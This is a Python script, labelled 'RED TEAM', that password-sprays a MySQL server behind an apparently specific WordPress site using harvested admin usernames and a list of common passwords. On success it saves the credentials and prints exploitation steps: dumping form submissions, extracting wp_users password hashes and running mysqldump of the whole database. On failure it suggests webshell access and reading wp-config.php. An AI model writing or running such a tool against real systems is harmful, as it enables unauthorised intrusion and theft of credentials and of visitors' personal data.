#!/usr/bin/env python3
"""
RED TEAM - MySQL Password Spray
Using discovered WordPress admin usernames
"""

import mysql.connector
import sys
from colorama import Fore, init

init(autoreset=True)

TARGET = "website.com"
PORT = 6767

# Discovered WordPress users
WP_USERS = ["admin", "admin-2", "wordpress", "wpadmin", "aryanfront"]

# Common passwords to try
COMMON_PASSWORDS = [
    "",  # Empty
    "password",
    "123456",
    "admin",
    "wordpress",
    "wpforms",
    "aryanfront",
    "aryanfront2026",
    "hostinger",
    "mysql",
    "root",
    "admin123",
    "password123",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "sunshine",
    "master",
    "hello",
    "freedom",
    "whatever",
    "qazwsx",
    "trustno1",
    "654321",
    "jordan23",
    "harley",
    "robert",
    "matthew",
    "jordan",
    "asshole",
    "daniel",
    "andrew",
    "lakers",
    "joshua",
    "1qaz2wsx",
    "123qwe",
    "1234",
    "12345",
    "12345678",
    "123456789",
    "1234567890",
]

print(f"{Fore.CYAN}=== RED TEAM - MYSQL PASSWORD SPRAY ===")
print(f"{Fore.YELLOW}Target: {TARGET}:{PORT}")
print(f"{Fore.YELLOW}WordPress Users: {', '.join(WP_USERS)}")
print(f"{Fore.YELLOW}Testing {len(COMMON_PASSWORDS)} passwords per user")
print(f"{Fore.YELLOW}Total attempts: {len(WP_USERS) * len(COMMON_PASSWORDS)}")
print("=" * 60)

found_creds = None
attempts = 0

for username in WP_USERS:
    print(f"\n{Fore.WHITE}[*] Spraying user: {username}")
    
    for password in COMMON_PASSWORDS:
        attempts += 1
        if attempts % 10 == 0:
            print(f"{Fore.YELLOW}   Attempts: {attempts}/{len(WP_USERS) * len(COMMON_PASSWORDS)}")
        
        try:
            conn = mysql.connector.connect(
                host=TARGET,
                port=PORT,
                user=username,
                password=password,
                connection_timeout=3,
                connect_timeout=3
            )
            
            # Test query
            cursor = conn.cursor()
            cursor.execute("SELECT 1")
            result = cursor.fetchone()
            
            if result and result[0] == 1:
                print(f"\n{Fore.GREEN}ðŸŽ¯ CREDENTIALS FOUND: {username}:{password if password else '(empty)'}")
                
                # Get MySQL info
                cursor.execute("SELECT VERSION(), USER(), DATABASE()")
                mysql_info = cursor.fetchone()
                print(f"{Fore.GREEN}   MySQL Version: {mysql_info[0]}")
                print(f"{Fore.GREEN}   Connected as: {mysql_info[1]}")
                print(f"{Fore.GREEN}   Current DB: {mysql_info[2]}")
                
                # List databases
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                print(f"{Fore.GREEN}   Databases: {len(databases)}")
                
                # Look for WordPress database
                wp_dbs = []
                for db in databases:
                    db_name = db[0]
                    if any(word in db_name.lower() for word in ['wordpress', 'wp_', 'aryan', 'site']):
                        wp_dbs.append(db_name)
                
                if wp_dbs:
                    print(f"{Fore.GREEN}   Possible WordPress DBs: {', '.join(wp_dbs)}")
                
                found_creds = (username, password)
                cursor.close()
                conn.close()
                break
                
        except mysql.connector.Error as e:
            # Silently continue on access denied
            pass
        except Exception as e:
            # Other errors
            pass
    
    if found_creds:
        break

print("\n" + "=" * 60)

if found_creds:
    username, password = found_creds
    print(f"{Fore.GREEN}âœ… SUCCESS! MySQL ACCESS GRANTED!")
    print(f"{Fore.GREEN}   Credentials: {username}:{password if password else '(empty)'}")
    
    # Save credentials
    with open("mysql_access.txt", "w") as f:
        f.write(f"Host: {TARGET}:{PORT}\n")
        f.write(f"User: {username}\n")
        f.write(f"Password: {password}\n")
        f.write(f"\nCommand: mysql -h {TARGET} -P {PORT} -u {username} -p'{password}'\n")
    
    print(f"{Fore.GREEN}ðŸ“ Credentials saved to: mysql_access.txt")
    
    # Immediate exploitation steps
    print(f"\n{Fore.CYAN}ðŸš€ IMMEDIATE EXPLOITATION:")
    print(f"{Fore.YELLOW}1. Connect to MySQL:")
    print(f"{Fore.WHITE}   mysql -h {TARGET} -P {PORT} -u {username} -p'{password}'")
    
    print(f"\n{Fore.YELLOW}2. Find WordPress database:")
    print(f"{Fore.WHITE}   SHOW DATABASES;")
    print(f"{Fore.WHITE}   USE wordpress_db;  # Replace with actual DB name")
    
    print(f"\n{Fore.YELLOW}3. Extract WPForms submissions:")
    print(f"{Fore.WHITE}   SELECT * FROM wp_wpforms_entries WHERE form_id = 54683;")
    
    print(f"\n{Fore.YELLOW}4. Get admin password hashes:")
    print(f"{Fore.WHITE}   SELECT user_login, user_pass FROM wp_users;")
    
    print(f"\n{Fore.YELLOW}5. Extract all data:")
    print(f"{Fore.WHITE}   mysqldump -h {TARGET} -P {PORT} -u {username} -p'{password}' wordpress_db > dump.sql")
    
else:
    print(f"{Fore.RED}âŒ NO CREDENTIALS FOUND")
    print(f"{Fore.YELLOW}âš ï¸  Password spray unsuccessful")
    print(f"{Fore.YELLOW}âš ï¸  MySQL credentials not in common password list")
    
    # Alternative approach
    print(f"\n{Fore.CYAN}ðŸ”§ ALTERNATIVE APPROACHES:")
    print(f"{Fore.YELLOW}1. Try to read wp-config.php via file upload")
    print(f"{Fore.YELLOW}2. Use different username list")
    print(f"{Fore.YELLOW}3. Brute force with larger wordlist")
    print(f"{Fore.YELLOW}4. Focus on webshell access (403 bypass)")

print(f"\n{Fore.CYAN}=== OPERATION COMPLETE ===")
